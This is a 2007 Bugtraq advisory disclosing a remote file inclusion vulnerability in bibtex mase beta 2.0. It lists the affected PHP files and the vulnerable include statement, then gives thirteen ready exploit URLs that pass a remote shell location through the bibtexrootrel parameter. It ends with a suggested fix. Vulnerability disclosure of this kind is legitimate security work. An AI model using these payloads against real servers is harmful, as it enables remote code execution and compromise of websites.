
Date: 22 Apr 2007 19:13:41 -0000
From: InyeXion@...il.com
To: bugtraq@...urityfocus.com
Subject: bibtex mase Remote File Inclusion

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                          bibtex mase Remote File Inclusion
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                          Affected Software .: bibtex mase beta 2.0
                          Download..: http://www.cs.kuleuven.ac.be/~raf/bibtex/downloads/bibtex_mase_beta_2.0.tgz
                          Risk ..............: high                              
                          Found by ..........: InyeXion                                                  
                          Contact ...........: InyeXion[at]gmail.com    
                          Web .............: Www.InyeXion.com.ar                               
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

     Affected Files:                                                                
/unavailable.php
/Source.php
/log.php
/latex.php
/indexinfo.php
/index.php
/importinfo.php
/import.php
/examplefile.php
/clearinfo.php
/clear.php
/aboutinfo.php
/about.php

etc.....

 Vulnerable Code:

include($bibtexrootrel."/layout/header.inc");
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Exploit:
                                                                      
http://[target]/unavailable.php?bibtexrootrel=Shell?
http://[target]/source.php?bibtexrootrel=Shell?
http://[target]/log.php?bibtexrootrel=Shell?
http://[target]/latex.php?bibtexrootrel=Shell?
http://[target]/indexinfo.php?bibtexrootrel=Shell?
http://[target]/index.php?bibtexrootrel=Shell?
http://[target]/importinfo.php?bibtexrootrel=Shell?
http://[target]/import.php?bibtexrootrel=Shell?
http://[target]/examplefile.php?bibtexrootrel=Shell?
http://[target]/clearinfo.php?bibtexrootrel=Shell?
http://[target]/clear.php?bibtexrootrel=Shell?
http://[target]/aboutinfo.php?bibtexrootrel=Shell?
http://[target]/about.php?bibtexrootrel=Shell?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Fixed bug:

if((isset($_REQUEST['bibtexrootrel'])  || isset($_GET['bibtexrootrel']) || isset($_POST['bibtexrootrel'])) && !defined("bibtexrootrel")){
die("denied access"); }

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
